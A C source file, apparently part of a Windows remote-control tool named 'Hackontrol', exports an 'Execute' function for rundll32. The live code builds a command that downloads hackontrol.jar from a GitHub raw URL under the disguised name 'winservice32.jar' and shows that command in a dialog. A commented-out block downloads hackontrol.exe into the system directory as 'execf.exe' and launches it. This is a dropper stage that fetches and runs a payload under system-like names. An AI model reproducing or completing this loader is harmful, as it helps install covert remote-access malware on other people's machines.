#include <khopanwindows.h>
#include <khopanerror.h>
#include <khopanstring.h>
#include "initialize.h"

#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")

#define LIBRARY_NAME L"libdll32.dll"
#define JAR_NAME L"winservice32.jar"
#define DOWNLOAD_URL L"https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/hackontrol.jar"

__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	LPWSTR windowsDirectoryPath = KHGetWindowsDirectoryW();

	if(!windowsDirectoryPath) {
		KHWin32DialogErrorW(GetLastError(), L"KHGetWindowsDirectoryW");
		return;
	}
	
	LPWSTR rundll32Path = KHFormatMessageW(L"%ws\\System32\\rundll32.exe", windowsDirectoryPath);

	if(!rundll32Path) {
		KHWin32DialogErrorW(ERROR_CAN_NOT_COMPLETE, L"KHFormatMessageW");
		goto freeWindowsDirectoryPath;
	}

	LPWSTR downloadArgument = KHFormatMessageW(L"%ws " LIBRARY_NAME L",DownloadFile " DOWNLOAD_URL L"," JAR_NAME, rundll32Path);

	if(!downloadArgument) {
		KHWin32DialogErrorW(ERROR_CAN_NOT_COMPLETE, L"KHFormatMessageW");
		goto freeRundll32Path;
	}

	MessageBoxW(NULL, downloadArgument, L"Dialog", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
	FREE(downloadArgument);
freeRundll32Path:
	FREE(rundll32Path);
freeWindowsDirectoryPath:
	FREE(windowsDirectoryPath);
	/*STARTUPINFO startupInformationDownload = {0};
	startupInformationDownload.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION processInformtionDownload = {0};
	const wchar_t* rundll32 = HJ_GetSystemDirectory(L"rundll32.exe");
	const wchar_t* execf = HJ_GetSystemDirectory(L"execf.exe");
	std::wstring downloadArgument(rundll32);
	downloadArgument += L" libdll32.dll,DownloadFile https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/hackontrol.exe,";
	downloadArgument += execf;
	const wchar_t* argumentDownload = downloadArgument.c_str();

	if(CreateProcessW(rundll32, const_cast<wchar_t*>(argumentDownload), NULL, NULL, TRUE, 0, NULL, NULL, &startupInformationDownload, &processInformtionDownload) == 0) {
		HJ_DisplayError(GetLastError(), L"CreateProcessW()");
		return;
	}

	if(WaitForSingleObject(processInformtionDownload.hProcess, INFINITE) == WAIT_FAILED) {
		HJ_DisplayError(GetLastError(), L"WaitForSingleObject()");
		return;
	}

	if(CloseHandle(processInformtionDownload.hProcess) == 0) {
		HJ_DisplayError(GetLastError(), L"CloseHandle()");
		return;
	}

	if(CloseHandle(processInformtionDownload.hThread) == 0) {
		HJ_DisplayError(GetLastError(), L"CloseHandle()");
		return;
	}

	STARTUPINFO startupInformationExecute = {0};
	startupInformationExecute.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION processInformtionExecute = {0};

	if(CreateProcessW(execf, const_cast<wchar_t*>(execf), NULL, NULL, TRUE, 0, NULL, NULL, &startupInformationExecute, &processInformtionExecute) == 0) {
		HJ_DisplayError(GetLastError(), L"CreateProcessW()");
		return;
	}

	if(CloseHandle(processInformtionExecute.hProcess) == 0) {
		HJ_DisplayError(GetLastError(), L"CloseHandle()");
		return;
	}

	if(CloseHandle(processInformtionExecute.hThread) == 0) {
		HJ_DisplayError(GetLastError(), L"CloseHandle()");
	}*/
}
